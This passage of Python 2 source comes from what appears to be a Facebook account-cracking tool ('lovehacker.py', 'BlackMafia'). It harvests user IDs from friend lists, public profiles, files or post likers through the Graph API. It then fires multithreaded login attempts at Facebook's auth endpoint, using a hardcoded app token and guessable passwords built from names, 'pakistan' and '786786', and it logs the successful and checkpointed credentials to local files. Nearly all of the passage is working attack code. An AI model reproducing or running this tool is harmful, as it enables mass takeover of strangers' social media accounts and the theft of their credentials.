                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/bangla.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos8
                                            cek = open('done/bangla.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mFinished ...'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;96mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;96mCP \x1b[1;96mfile Save \x1b[1;91m: \x1b[1;92mdone/bangla.txt'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m{<\x1b[1;96mBack\x1b[1;97m>}')
    os.system('python2 lovehacker.py')


def crack_pakis():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 36 * '\x1b[1;94m\xe2\x96\x93'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} Crack From Friend list'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} Crack From Public Frendlist'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} Crack From File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Back'
    print 36 * '\x1b[1;94m\xe2\x96\x93'
    pilih_pakis()


def pilih_pakis():
    teak = raw_input('\x1b[1;91mSlect Options \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Fill Correctly !'
        pilih_pakis()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print 36 * '\x1b[1;94m\xe2\x96\x93'
            print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print 36 * '\x1b[1;94m\xe2\x96\x93'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mID Public/friend \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public / friend does not exist !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Back>\x1b[1;91m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} No Internet Conection!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mNama File\x1b[1;91m :\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Back>\x1b[1;91m]')
                crack_pakis()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Fill Correctly !'
            pilih_pakis()
        print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mStop Tekan CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mCrack Start ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mUse Airplane Mode If Nothing Is Working'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/pakis.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos1
                cek = open('done/pakis.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/pakis.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos2
                    cek = open('done/pakis.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/pakis.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos3
                        cek = open('done/pakis.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'pakistan'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/pakis.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos4
                            cek = open('done/pakis.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = '786786'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/pakis.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos5
                                cek = open('done/pakis.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['last_name'].lower() + '786'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/pakis.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos6
                                    cek = open('done/pakis.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/pakis.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos7
                                        cek = open('done/pakis.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/pakis.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos8
                                            cek = open('done/pakis.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mFinished ...'
    print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;91mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;91m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;91mCP \x1b[1;91mfile Save \x1b[1;91m: \x1b[1;92mdone/pakis.txt'
    print 36 * '\x1b[1;94m\xe2\x96\x93'
    raw_input('\x1b[1;97m{<\x1b[1;91mBack\x1b[1;97m>}')
    os.system('python2 lovehacker.py')


def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        print '        \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK POSTINGAN GRUP/friend\x1b[1;96m \xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        tez = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m ID Postingan Group/friend \x1b[1;91m :\x1b[1;92m ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=9999999&access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        jalan('\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mTake ID \x1b[1;97m...')
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID Incorrect Post !'
        raw_input('\n\x1b[1;96m[<\x1b[1;97mBack>\x1b[1;96m]')
        menu()

    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mStop Tekan CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mCrack Starting ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\n\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mUse Airplane Mode If Nothing Is Working'
